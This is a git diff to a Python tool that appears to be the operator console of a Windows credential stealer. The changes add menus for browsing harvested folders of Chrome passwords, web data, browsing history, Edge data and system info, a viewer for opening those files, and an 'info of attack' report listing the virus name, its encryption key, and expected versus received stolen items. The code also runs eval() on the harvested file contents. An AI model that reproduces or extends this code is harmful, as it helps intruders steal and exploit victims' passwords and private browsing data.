@@ -6,7 +6,8 @@ import random
 import shutil
 import tkinter as tk 
 import win32crypt
-import base64;import webbrowser
+import base64;
+import webbrowser
 from termcolor import colored
 from datetime import datetime,timedelta
 from Crypto.Cipher import AES
@@ -23,10 +24,11 @@ list_dir=os.listdir(info_resorse)
 # conficuration of code
 def display_text(text):
     root = tk.Tk()
-    root.configure(background='black')
-    frame = tk.Frame(root, bg='black')
+    root.configure(background='#0a0a0a')
+    root.geometry("1200x400") 
+    frame = tk.Frame(root, bg='#0a0a0a')
     frame.pack(fill='both', expand=True)
-    text_widget = tk.Text(frame, wrap='word', bg='black', fg='white', font=('Courier New', 12))
+    text_widget = tk.Text(frame, wrap='word', bg='#0a0a0a', fg='white', font=('8514oem', 8))
     text_widget.insert('1.0', text)
     text_widget.pack(side='left', fill='both', expand=True)
     v_scrollbar = tk.Scrollbar(frame, orient='vertical', command=text_widget.yview)
@@ -171,19 +173,55 @@ def opening_data(name='',data=''):
     elif name in ('chrome_id_passnew','chrome_id_pass'):data_get=chrome_id_and_password_configuraation(data)
     elif name in ('chrome_web_datanew','chrome_web_data'):data_get=chrome_web_data_configuration(data)
     elif name in ('system_edgenew','system_edge'):data_get=edge_data_configuration(data)
-    elif name in ('system_infonew','system_infon'):data_get=system_info_basic_configuration(data)
+    elif name in ('system_infonew','system_info'):data_get=system_info_basic_configuration(data)
     else:data_get=None
     return data_get
+def show_json_info(path):
+    with open(path,'r',encoding='Utf-8')as lol1:data=json.load(lol1)
+    def data_get(name):
+        try:
+            info=data["expected_return"][name]
+        except Exception: info=None
+        return str(info)
+    def data_get1(name):
+        try:
+            info=data["we_got_in_return"][name]
+        except Exception: info=None
+        return str(info)
+    print(colored('-'*40+'info of attack'+'-'*40,'yellow'))
+    print(colored('Name of Virus :- ','blue')+colored(data['name_of_virus'],'white',attrs=['bold']))
+    print(colored('Encryption Key :- ','blue')+colored(data['encryption_key'],'cyan')+'\n')
+    print(colored('Information Given:------------','blue'))
+    print(colored('   - Created Date: ','blue')+colored(data['created_date']))
+    print(colored('   - Last Time Opened: ','blue')+colored(data['last_time_open']))
+    print(colored('   - Received Status: ','blue')+colored(data['ressived_status']))
+    print(colored('   - Data Received Time: ','blue')+colored(data['data_resived_time']))
+    print(colored('='*65,'black')+'\n'+'|{:^{}}|{:^{}}|{:^{}}|'.format(colored('Value','light_yellow'),29,colored('Expected return','yellow'),30,colored('We got in return','yellow'),30)+'\n'+colored('-'*66,'black'))
+    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('system_info','light_yellow'),29,colored(data_get("system_info"),'blue'),30,colored(data_get1("system_info"),'blue'),30)+'\n'+colored('-'*66,'black'))
+    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('chrome_basic_data','light_yellow'),29,colored(data_get("chrome_basic_data"),'blue'),30,colored(data_get1("chrome_basic_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
+    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('chrome_id-pass','light_yellow'),29,colored(data_get("chrome_id-pass"),'blue'),30,colored(data_get1("chrome_id-pass"),'blue'),30)+'\n'+colored('-'*66,'black'))
+    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('chrome_web_data','light_yellow'),29,colored(data_get("chrome_web_data"),'blue'),30,colored(data_get1("chrome_web_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
+    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('chrome_history_data','light_yellow'),29,colored(data_get("chrome_history_data"),'blue'),30,colored(data_get1("chrome_history_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
+    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('edge_data','light_yellow'),29,colored(data_get("edge_data"),'blue'),30,colored(data_get1("edge_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
+    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('dir_search','light_yellow'),29,colored(data_get("dir_search"),'blue'),30,colored(data_get1("dir_search"),'blue'),30)+'\n'+colored('-'*66,'black'))
+    print('|{:^{}}|{:^{}}|{:^{}}|'.format(colored('encryption_data','light_yellow'),29,colored(data_get("encryption_data"),'blue'),30,colored(data_get1("encryption_data"),'blue'),30)+'\n'+colored('-'*66,'black'))
 #related to devlopment 
-def show_files(list_dir,bool_dir_search):
-    print(colored('-'*28+' All_Extracted_Fills '+'-'*28,'yellow'))
-    print(colored("{:<{}}-    {:<{}}-  {} -   {}".format("num",6,'File names',40,'encryption','file type',)+'\n'+'-'*78,'light_yellow'))
-    for num,value in enumerate(list_dir,start=1):
-        encryption_staus='True' if value.endswith('new') else 'False'
-        type_file = 'TXT' if value.endswith('.txt') else ('Python' if value.endswith('.py') else ('xlsx' if value.endswith('.xlsx') else ('docx' if value.endswith('.docx') else ('pptx' if value.endswith('.pptx') else ('xls' if value.endswith('.xls') else ('doc' if value.endswith('.doc') else ('rtf' if value.endswith('.rtf') else ('msg' if value.endswith('.msg') else ('eml' if value.endswith('.eml') else ('csv' if value.endswith('.csv') else ('xml' if value.endswith('.xml') else ('html' if value.endswith('.html') else ('mht' if value.endswith('.mht') else ('odt' if value.endswith('.odt') else ('ods' if value.endswith('.ods') else ('odp' if value.endswith('.odp') else ('odf' if value.endswith('.odf') else ('dotx' if value.endswith('.dotx') else ('dotm' if value.endswith('.dotm') else ('dot' if value.endswith('.dot') else 'File'))))))))))))))))))))
-        print("{:<{}}-    {:<{}}-   {:<{}}-   {}".format(colored(f"[{num}]",'light_yellow'),15,colored(str(value),'magenta'),49,colored(str(encryption_staus),'blue'),19,colored(str(type_file),'red')))
-    print("{:<{}}-    {:<{}}-   {:<{}}-   {}".format(colored("[999]",'light_yellow'),15,colored('Dir_search','yellow'),49,colored('None','blue'),19,colored('Dir','light_red'))) if bool_dir_search else None
-    response=input(colored('([n]for going back)enter your response here:  ','red'))
+def show_files(list_dir,path):
+    while True:
+        skull_img(True)
+        print(colored('-'*28+' All_Extracted_Fills '+'-'*28,'yellow'))
+        print(colored("{:<{}}-    {:<{}}-  {} -   {}".format("num",6,'File names',40,'encryption','file type',)+'\n'+'-'*78,'light_yellow'))
+        for num,value in enumerate(list_dir,start=0):
+            encryption_staus='True' if value.endswith('new') else 'False'
+            type_file ='Dir' if os.path.isdir(path+'\\'+value) else ('TXT' if value.endswith('.txt') else ('Python' if value.endswith('.py') else ('xlsx' if value.endswith('.xlsx') else ('docx' if value.endswith('.docx') else ('pptx' if value.endswith('.pptx') else ('xls' if value.endswith('.xls') else ('doc' if value.endswith('.doc') else ('rtf' if value.endswith('.rtf') else ('msg' if value.endswith('.msg') else ('eml' if value.endswith('.eml') else ('csv' if value.endswith('.csv') else ('xml' if value.endswith('.xml') else ('html' if value.endswith('.html') else ('mht' if value.endswith('.mht') else ('odt' if value.endswith('.odt') else ('ods' if value.endswith('.ods') else ('odp' if value.endswith('.odp') else ('odf' if value.endswith('.odf') else ('dotx' if value.endswith('.dotx') else ('dotm' if value.endswith('.dotm') else ('dot' if value.endswith('.dot') else 'File')))))))))))))))))))))
+            print("{:<{}}-    {:<{}}-   {:<{}}-   {}".format(colored(f"[{num}]",'light_yellow'),15,colored(str(value),'magenta'),49,colored(str(encryption_staus),'blue'),19,colored(str(type_file),'red')))
+        response= input(colored('([n]for going back)enter your response here:  ','red'))
+        if response.isdigit() and int(response)>-1 and int(response)<len(list_dir):
+            if list_dir[int(response)]=='dir_search':nothing=input(colored('dir search file encrypted u can directally open them in this path-> '+path,'yellow'));continue
+            elif str(list_dir[int(response)]).endswith('new'):nothing=input(colored('file encrypted first decrypt them','red'));continue
+            else: return int(response)
+        elif response=='n':return None
+        else:nothing=input(colored('you typed something wrong type digit only and within the range','light_red'))
 def number_decoding(number:str,key:str):
     k=key.split('0');k.pop(k.index(''))
     w='abcdefghijklmnopqrstuvwxyz!@#$%^&*()_-+={}[]|\\:;\"\'<,>.?/~` 1234567890'
@@ -568,9 +606,11 @@ def collecting_data(info_resorse):
         print(colored('go to use data_viewer tab hint(main.py option-[3]) and put this path there to view data this part work is to extract the data decrypt them and save it path thank u :)','blue'))
     print('use data_viewer tab in main.py hint-option[3] to view data and content')
     nothing=input(colored('all data has been extracted tap anything and enter to continue','yellow'))
+#check with every perspective---->:) (-.-)(-_-)(--)
 def viwing_data(info_resorse):
     while True:
         while True:
+            #checkig for profiles.....
             skull_img(True)
             if os.path.exists(info_resorse):pass
             else:return False
@@ -578,12 +618,16 @@ def viwing_data(info_resorse):
             for num,folder in enumerate((list_of_file:=os.listdir(info_resorse)),start=0):
                 print(colored(' '*25+'[{}] - {}'.format(str(num),str(folder)),'blue'))
             print(colored(' '*25+'[99] - spacify path ','light_blue'))
+            #asking for profile which you wanna see
             response=input(colored(' '*20+'([n]for back) enter ur respose here ','red'))
+            #modifiving all the input to take only valid input for chousing company
             if response=='n':return None
-            elif response.isdigit() and int(response)>=0 and int(response)<=len(list_of_file)-1:anser=True;break
+            elif not response.isdigit():nothing=input(colored(' '*20+'you typed alphabat type number only','red'))
+            elif int(response)>=0 and int(response)<=len(list_of_file)-1:anser=True;break
             elif response=='99':anser=False;break
-            elif response.isdigit() and int(response)<=0 or int(response)>len(list_of_file):print(colored(' '*20+'you typed number out of range'))
+            elif int(response)<=0 or int(response)>len(list_of_file):print(colored(' '*20+'you typed number out of range'))
             else:nothing=input(colored(' '*20+'you type something wrong /?\\ enter to continue','red'))
+        #if anser true means selected any one of profile data to ssee
         if anser:
             while True:
                 skull_img(True)
@@ -593,34 +637,63 @@ def viwing_data(info_resorse):
                     print(colored(' '*23+'[2] info about the hack','blue'))
                     print(colored(' '*23+'[3] go back','blue'))
                     answer=input(colored(' '*20+'enter ur response here ','red'))
+                    #modifiyeing input to take only valid input...
                     if answer=='1':
-                        path=os.listdir(info_resorse+'\\'+list_of_file[int(response)]+'\\collected_data')
-                        list_dir=os.listdir(path)
-                        if os.path.exists(path+'\\dir_search'):
-                            
-                        show_files(list_dir)
-                    elif answer=='2':print('under proseess');time.sleep(2)
+                        while True:
+                            list_dir=os.listdir(info_resorse+'\\'+list_of_file[int(response)]+'\\collected_data')
+                            response_inside=show_files(list_dir,info_resorse+'\\'+list_of_file[int(response)]+'\\collected_data')
+                            if not response_inside==None or False:
+                                try:
+                                    print(colored('opening document '+list_dir[response_inside],'yellow'))
+                                    with open(info_resorse+'\\'+list_of_file[int(response)]+'\\collected_data\\'+list_dir[response_inside],'r',encoding='Utf-8')as file:
+                                        display_text(opening_data(list_dir[response_inside],eval(file.read())))     
+                                except Exception as e:nothing=input(colored('an error arcued while opening the document '+str(e),'red'))
+                            else:break
+                    elif answer=='2':
+                        skull_img(True)
+                        try:
+                            path=info_resorse+'\\'+list_of_file[int(response)]+'\\database\\info.json'
+                            show_json_info(path)
+                        except Exception as e:print(colored('there is some error while factuing daata'+str(e),'red'))
+                        nothing=input(colored('tap enter to continue ','yellow'))
                     elif answer=='3':break
-                    else:nothing=input(colored(''*20+'type under given option','red'));continue
+                    else:nothing=input(colored('type under given option','red'));continue
                 else:nothing=input(colored(' '*15+'There is some error','red'));break
         else:
             while True:
                 skull_img(True)
-                path=input('enter the path where file is :')
-                if os.path.exists():
-                    pass
-                else:continue
-                print(colored(' '*20+'what u wanna see here?','yellow'))
-                print(colored(' '*23+'[1] data gatered ','blue'))
-                print(colored(' '*23+'[2] info about the hack','blue'))
-                print(colored(' '*23+'[3] go back','blue'))
-                answer=input(colored(' '*20+'enter ur response here ','red'))
-                if answer=='1':print('under proseess');time.sleep(2)
-                elif answer=='2':print('under proseess');time.sleep(2)
-                elif answer=='3':break
-                else:nothing=input(colored(''*20+'type under given option','red'));continue
-                
-
+                if (path_input:=input(' '*20+colored('([n]for back) enter the path where file is :','blue')))=='n':break
+                if not os.path.exists(path_input):nothing=input(colored('wrong_path'.center(70),'red'));continue
+                elif os.path.exists(path_input):pass
+                else:nothing=input(colored(' '*20+'something went wrong','red'));continue
+                while True:
+                    print(colored(' '*20+'what u wanna see here?','yellow'))
+                    print(colored(' '*23+'[1] data gatered ','blue'))
+                    print(colored(' '*23+'[2] info about the hack','blue'))
+                    print(colored(' '*23+'[3] go back','blue'))
+                    answer=input(colored(' '*20+'enter ur response here ','red'))
+                    if answer=='1':
+                        while True:
+                            list_dir=os.listdir(path_input)
+                            response_inside=show_files(list_dir,path_input)
+                            if not response_inside==None or False:
+                                if not list_dir[response_inside] in ['system_info','chrome_data','chrome_id_pass','chrome_web_data','chr_history_data','system_edge']:print(colored('data not acknowleged may couse error while data extracting','red'))
+                                try:
+                                    print(colored('opening document '+list_dir[response_inside],'yellow'))
+                                    with open(path_input+list_dir[response_inside],'r',encoding='Utf-8')as file:
+                                        display_text(opening_data(list_dir[response_inside],eval(file.read())))     
+                                except Exception as e:nothing=input(colored('an error arcued while opening the document '+str(e),'red'))
+                            else:break
+                    elif answer=='2':
+                        skull_img(True)
+                        try:
+                            path=path_input+'\\info.json'
+                            show_json_info(path)
+                        except Exception as e:print(colored('there is some error while factuing daata'+str(e),'red'))
+                        nothing=input(colored('tap enter to continue ','yellow'))
+                    elif answer=='3':break
+                    else:nothing=input(colored(''*20+'type under given option','red'));continue
+                break
 #main code begings from here:---=>
 #first screen........
 print(colored('welcome','yellow'))
@@ -652,7 +725,3 @@ while True:
         if input(' '*15+colored('you sure you wanna exist the code? y/n','light_red')).lower()=='y':break
         else:pass
     else:nothing=input(colored('you may type something else type something from given option tap enter to continue','red'))
-    
-    
-    
-    
